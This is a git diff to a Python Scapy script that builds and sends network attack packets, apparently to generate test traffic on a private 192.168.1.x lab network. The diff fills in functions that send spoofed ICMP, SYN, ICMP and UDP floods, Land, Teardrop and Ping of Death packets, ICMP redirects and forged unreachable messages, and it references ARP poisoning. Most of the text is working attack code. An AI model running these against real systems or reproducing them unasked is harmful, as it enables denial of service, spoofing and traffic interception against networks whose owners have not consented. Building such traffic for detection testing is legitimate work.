@@ -1,5 +1,6 @@
 #! /usr/bin/env python
 from scapy.all import send, sr, IP, ICMP, ARP, RandIP, RandMAC, TCP, UDP, RIP, RIPEntry
+from scapy.volatile import RandByte
 import fileinput
 import sys
 
@@ -14,28 +15,29 @@ def IPSweep(ipDestination, payload):
 def PortScan(ipDestination): 
     packet = IP(dst=ipDestination) / TCP(dport=(1,2000), flags="S")
     return packet
-def IPSpoof(ipDestination, ipSource, payload):
-    packet = IP(dst=ipDestination, src=ipSource) / ICMP() / payload
+def IPSpoof(ipDestination, ipSource):
+    packet = IP(dst=ipDestination, src=ipSource) / ICMP() / "0123456789"
     return packet
-def SFFlag(ipDestination, flags): 
-    packet = IP(dst=ipDestination) / TCP(flags=flags)
+def SFFlag(ipDestination): 
+    packet = IP(dst=ipDestination) / TCP(flags="SF")
     return packet
-def FFlag(ipDestination, flags): 
-    packet = IP(dst=ipDestination) / TCP(flags=flags)
+def FFlag(ipDestination): 
+    packet = IP(dst=ipDestination) / TCP(flags="F")
     return packet
-def URGFlag(ipDestination, flags, port):
-    packet = IP(dst=ipDestination) / TCP(flags=flags, dport=port)
+def URGFlag(ipDestination):
+    packet = IP(dst=ipDestination) / TCP(flags="U", dport=139)
     return packet
-def NoFlag(ipDestination, flags):
-    packet = IP(dst=ipDestination) / TCP(flags=flags)
+def NoFlag(ipDestination):
+    packet = IP(dst=ipDestination) / TCP(flags="")
     return packet
 
 # Denial of Service Attacks #
-def SYNFlood(ipDestination, flags, port):
-    packet = IP(dst=ipDestination) / TCP(dport=port, flags=flags)
+def SYNFlood(ipDestination):
+    packet = IP(dst=ipDestination) / TCP(dport=139, flags="S")
     return packet
-def ICMPFlood(ipDestination, payload, shouldSpoofAddress):
-    packet = IP(dst=ipDestination) / ICMP() / payload
+def ICMPFlood(ipDestination):
+    #With unspoofed address
+    packet = IP(dst=ipDestination) / ICMP() / "0123456789"
     return packet
 def DropCommunication(ipDestination1, ipDestination2):
     packet1 = IP(dst=ipDestination1) / ICMP(type=3, code=1)
@@ -44,18 +46,18 @@ def DropCommunication(ipDestination1, ipDestination2):
 def ICMPRedirect(victim, attacker):
     packet = IP(dst=victim) / ICMP(type=5, code=1, gw=attacker)
     return packet
-def UDPflood(ipDestination, payload):
-    packet = IP(dst=ipDestination) / UDP(dport=20) / (payload * RandByte())
+def UDPFlood(ipDestination):
+    packet = IP(dst=ipDestination) / UDP(dport=20) / ("XABCDEFG" * RandByte())
     return packet
-def LandAttack(ipDestination, ipSource):
-    packet = IP(dst=ipDestination, src=ipSource) / TCP(sport=139, dport=139, flags="S")
+def LandAttack(ipDestination):
+    packet = IP(dst=ipDestination, src=ipDestination) / TCP(sport=139, dport=139, flags="S")
     return packet
-def TeardropAttack(ipDestination1, ipDestination2, flags):
-    packet1 = IP(dst=ipDestination1, flags=flags, id=12) / UDP() / ("X" * 100)
-    packet2 = IP(dst=ipDestination2, id=12, frag=2) / UDP() / ("X" * 2)
+def TeardropAttack(ipDestination):
+    packet1 = IP(dst=ipDestination, flags="MF", id=12) / UDP() / ("X" * 100)
+    packet2 = IP(dst=ipDestination, id=12, frag=2) / UDP() / ("X" * 2)
     return packet1, packet2
-def PingOfDeath(ipDestination1, payload):
-    packet = IP(ipDestination2) / ICMP() / (payload * 65508)
+def PingOfDeath(ipDestination):
+    packet = IP(dst=ipDestination) / ICMP() / ("X" * 65508)
     return packet
 
 # Man in the Middle Attacks
@@ -95,31 +97,60 @@ def RunPortScan():
     sr(packet, inter=0.005)
     return "RunPortScan"
 def RunIPSpoof():
-    return 0
+    packet = IPSpoof("192.168.1.1", "192.168.1.117")
+    send(packet)
+    return "IPSpoof"
 def RunSFFlag(): 
-    return 0
+    packet = SFFlag("192.168.1.1")
+    send(packet)
+    return "SFFlag"
 def RunFFlag(): 
-    return 0
+    packet = FFlag("192.168.1.1")
+    send(packet)
+    return "FFlag"
 def RunURGFlag():
-    return 0
+    packet = URGFlag("192.168.1.1")
+    send(packet)
+    return "URGFlag"
 def RunNoFlag():
-    return 0
+    packet = NoFlag("192.168.1.1")
+    send(packet)
+    return "NoFlag"
 def RunSYNFlood():
-    return 0
+    packet = SYNFlood("192.168.1.1")
+    send(packet)
+    return "SYNFlood"
 def RunICMPFlood():
-    return 0
+    packet = ICMPFlood("192.168.1.1")
+    send(packet)
+    return "ICMPFlood"
 def RunDropCommunication():
-    return 0
+    packets = DropCommunication("192.168.1.1", "192.168.1.2")
+    send(packets[0])
+    send(packets[1])
+    return "DropCommunication"
 def RunICMPRedirect():
-    return 0
+    packet = ICMPRedirect("192.168.1.1", "192.168.1.117")
+    send(packet)
+    return "ICMPRedirect"
 def RunUDPFlood():
-    return 0
+    packet = UDPFlood("192.168.1.1")
+    send(packet)
+    return "UDPFlood"
 def RunLandAttack():
-    return 0
+    packet = LandAttack("192.168.1.1")
+    send(packet)
+    return "LandAttack"
 def RunTeardropAttack():
-    return 0
+    packets = TeardropAttack("192.168.1.1")
+    send(packets[0])
+    send(packets[1])
+    return "TeardropAttack"
 def RunPingOfDeath():
-    return 0
+    packet = PingOfDeath("192.168.1.1")
+    #send(packet)
+    print("---Fix PingOfDeath---")
+    return "PingOfDeath"
 def RunARPPoisoning():
     packets = ARPPoisoning()
     print("packet 0 =" + str(packets[0]))
